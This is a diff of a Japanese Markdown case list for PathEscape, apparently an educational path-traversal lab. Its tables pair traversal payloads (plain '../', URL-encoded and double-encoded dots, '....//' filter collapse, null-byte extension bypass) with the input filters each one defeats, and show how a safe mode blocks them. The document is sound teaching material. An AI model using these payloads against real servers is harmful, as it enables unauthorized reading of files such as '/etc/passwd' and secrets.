@@ -1,173 +1,42 @@
-# Demo Cases for PathEscape
+# PathEscape 入力例の一覧
 
-本ファイルは PathEscape の挙動を確認するためのテストケース一覧です。  
-講義や QA チェックで利用してください。各ケースは「入力」「ステージ/モード」「期待挙動」を明示しています。
+攻撃体験タブで試す入力と、そのときの挙動の一覧です。目標は `/secrets/flag.txt` を取ることです。
+自動テスト（`test/core.test.js`）が、この表を計算部で検証しています。
 
----
+## フィルターごとの「効く手法」（Vulnerable モード）
 
-## 1. Beginner Stage
+各フィルターには欠陥が1つあり、それを破る手法が1つ対応します。
 
-### Case 1: 公開ファイルの取得（相対パス）
-- Input: `public.txt`
-- Mode: Vulnerable
-- Expect: `/app/files/public.txt` の内容を取得できる
+| フィルター | 入力 | 結果 |
+|---|---|---|
+| なし | `../../secrets/flag.txt` | フラグ取得 |
+| 生の `..` を弾く | `%2e%2e/%2e%2e/secrets/flag.txt` | フラグ取得（生入力に `..` が出ない） |
+| `../` を消す | `....//....//secrets/flag.txt` | フラグ取得（消したあとに `../../` が組み上がる） |
+| デコードして `..` を弾く | `%252e%252e%252f%252e%252e%252fsecrets%252fflag.txt` | フラグ取得（1回のデコードでは戻りきらない） |
+| 拡張子チェック（画像だけ） | `../../secrets/flag.txt%00.png` | フラグ取得（拡張子は `.png`、取得は `.txt`） |
 
-### Case 2: 公開ファイルの取得（絶対パス）
-- Input: `/app/files/public.txt`
-- Mode: Vulnerable
-- Expect: `/app/files/public.txt` の内容を取得できる
+## 手法が「効かない」組み合わせ（教材のポイント）
 
-### Case 3: `..` を1回使用
-- Input: `../etc/passwd`
-- Mode: Vulnerable
-- Expect: 正規化後 `/app/etc/passwd` を参照 → VFSに存在しなければ「File not found」
+手法は、狙った欠陥フィルター以外には効きません。
 
-### Case 4: `..` を2回使用
-- Input: `../../etc/passwd`
-- Mode: Vulnerable
-- Expect: 正規化後 `/etc/passwd` を取得（VFSに存在する場合）
-- Mode: Safe → Expect: ブロック（Access denied）
+| 入力 | フィルター | 結果 |
+|---|---|---|
+| `../../secrets/flag.txt` | 生の `..` を弾く | ブロック（生入力に `..` がある） |
+| `%2e%2e/%2e%2e/secrets/flag.txt` | デコードして `..` を弾く | ブロック（デコードすると `..` が出る） |
+| `....//....//secrets/flag.txt` | 生の `..` を弾く | ブロック（`..` を含む） |
+| `../../secrets/flag.txt` | 拡張子チェック | ブロック（`.txt` は画像でない） |
+| `../../secrets/flag.txt%00.png` | 生の `..` を弾く | ブロック |
 
----
+## 正規のファイル・そのほか
 
-## 2. Intermediate Stage
+| 入力 | モード | 結果 |
+|---|---|---|
+| `/app/files/readme.md` | Vulnerable / Safe | 取得できる |
+| `/robots.txt` | Vulnerable（フィルターなし） | 機密パスのヒントが読める |
+| `../../secrets/flag.txt` | Safe | アクセス拒否（base の外） |
+| `../../etc/passwd` | Vulnerable（フィルターなし） | `/etc/passwd` を取得 |
 
-### Case 5: 単純な `..` をブロック
-- Input: `../../etc/passwd`
-- Stage: Intermediate
-- Mode: Vulnerable
-- Expect: フィルターにより「入力ブロック」と表示される
+## 補足
 
-### Case 6: 部分エンコードを利用した回避
-- Input: `%2e%2e/%2e%2e/etc/passwd`
-- Stage: Intermediate
-- Mode: Vulnerable
-- Expect: フィルターをすり抜けて `/etc/passwd` に到達（URLデコード後に`../..`となり正規化される）
-
-### Case 7: 完全エンコードを利用した回避
-- Input: `%2e%2e%2f%2e%2e%2fsecrets%2fflag.txt`
-- Stage: Intermediate
-- Mode: Vulnerable
-- Expect: フィルターをすり抜けて `/secrets/flag.txt` に到達しフラグを取得
-
----
-
-## 3. Advanced Stage
-
-### Case 8: 標準的な攻撃のブロック
-- Input: `../../etc/passwd`
-- Stage: Advanced
-- Mode: Vulnerable
-- Expect: 高度なフィルターによりブロックされる
-
-### Case 9: ダブルスラッシュ回避
-- Input: `..//..//etc/passwd`
-- Stage: Advanced
-- Mode: Vulnerable
-- Expect: フィルターをすり抜けて `/etc/passwd` に到達（教育的に設計された脆弱性）
-
-### Case 10: 混合パターン回避
-- Input: `..././..././etc/passwd`
-- Stage: Advanced
-- Mode: Vulnerable
-- Expect: フィルターをすり抜けて `/etc/passwd` に到達
-
-### Case 11: 混合エンコード回避
-- Input: `..%2f..%2fetc%2fpasswd`
-- Stage: Advanced
-- Mode: Vulnerable
-- Expect: フィルターをすり抜けて `/etc/passwd` に到達
-
-### Case 12: Null文字インジェクション
-- Input: `../../etc/passwd%00.txt`
-- Stage: Advanced
-- Mode: Vulnerable
-- Expect: フィルターをすり抜けて `/etc/passwd` に到達（Null文字が拡張子チェックを回避）
-
----
-
-## 4. Secret Flag Retrieval
-
-### Case 13: フラグファイル取得（直接）
-- Input: `/secrets/flag.txt`
-- Mode: Vulnerable
-- Expect: `FLAG{day068_success}` を取得 → UIにバッジが表示される
-
-### Case 14: フラグファイル取得（相対）
-- Input: `../../secrets/flag.txt`
-- Mode: Vulnerable
-- Expect: 正規化でフラグに到達して取得
-- Mode: Safe → Expect: `Access denied: path outside base (safe mode)` でブロック
-
-### Case 15: Safe vs Vulnerable比較
-- Input: `../../etc/passwd`
-- Mode: Vulnerable → Expect: `/etc/passwd` を取得
-- Mode: Safe → Expect: `Access denied: path outside base (safe mode)` でブロック
-
----
-
-## 5. Recon / Enumeration （追加：教材用シナリオ）
-
-> **注意（重要）**: 以下は教育目的のシミュレーションです。実運用サイトや第三者のサービスに対して無許可のスキャンや列挙行為を行うことは禁止されています。本演習では PathEscape 内の模擬コンテンツに限定して実施してください。
-
-### Case 16: robots.txt による手がかり
-- Input: `/robots.txt`
-- Mode: Vulnerable
-- Expect: robots.txtの内容から `/secrets/flag.txt` の存在を推測できるヒントを取得
-
-### Case 14: sitemap / index 断片からの推測
-- Setup: サイトマップやページ断片に `secrets/flag.txt` へのリンクやスニペットが含まれている想定
-- Action: 学習者は公開ページの断片を探し、そこから機密ファイルのヒントを得る
-- Expect: 発見したヒントを基に `/secrets/flag.txt` を入力してフラグ取得を試みる（Vulnerable で成功、Safe でブロック）
-
-### Case 15: リポジトリ断片（情報漏洩）のシミュレーション
-- Setup: 教材用に `config.sample` や `deploy.sh.example` に `/secrets/flag.txt` のパスを記載した模擬断片を用意
-- Action: 学習者は模擬リポジトリ断片を参照して、機密ファイルパスを特定する
-- Expect: 特定したパスを使って Vulnerable モードでアクセスし、Safe モードでの防御を体験
-
-### Case 16: ワードリスト（辞書）による列挙（模擬）
-- Setup: 小さめのワードリスト（例: `["flag.txt","secret.txt","backup.zip","admin.zip"]`）を教材内で用意
-- Action: PathEscape の「列挙シミュレータ」（教材用機能）でワードリストを試す
-- Expect: 一致するパスがあればヒットし、どのように推測され得るかを学ぶ。**実環境での自動列挙は禁止**と明記すること。
-
-### Case 17: レスポンスの違いから存在確認（タイミング/メッセージ差）
-- Action: 存在するパスと存在しないパスで表示されるメッセージやレスポンス（例: エラーメッセージ、タイムアウト）を比較
-- Expect: 微妙なレスポンス差が情報漏洩につながる可能性を理解する（教材で差をわかりやすく示す）
-
----
-
-## 6. デバッグ / 開発用ケース
-
-### コンソールでの正規化確認
-
-ブラウザの開発者ツール（DevTools）の **Console** を使うと、パス解決の流れを直接確認できます。  
-以下のスニペットを貼り付けて実行してください。
-
-```js
-// VFS に登録されているキー一覧を表示
-console.log('VFS keys:', Object.keys(window.VFS || {}));
-
-// サンプル入力 ../etc/passwd を正規化して確認
-const BASE = '/app/files/';
-const userInput = '../etc/passwd';
-const combined = (userInput.startsWith('/') ? userInput : BASE + userInput).replace(/\/+/g,'/');
-const normalized = normalizePath(combined);
-
-console.log('userInput =', userInput);
-console.log('combined  =', combined);
-console.log('normalized=', normalized);
-console.log('VFS has normalized?', !!window.VFS[normalized]);
-```
-
-出力例は以下のとおりです。
-
-```
-userInput = ../etc/passwd
-combined  = /app/files/../etc/passwd
-normalized= /app/etc/passwd
-VFS has normalized? false
-```
-
-このようにして、なぜファイルが取得できないのか／どのように正規化されているのかを確認できます。
-
-教材として「..」を何回書けば目的の階層に移動できるのか」を理解する助けになります。
+- Safe モードは、どのフィルターでも、正規化後に `/app/files/` の外へ出る入力を拒否します。
+- 出力には、入力→フィルター通過後→URLデコード後→正規化後→取得パスの途中経過が出ます。どこで止まったかを確かめられます。
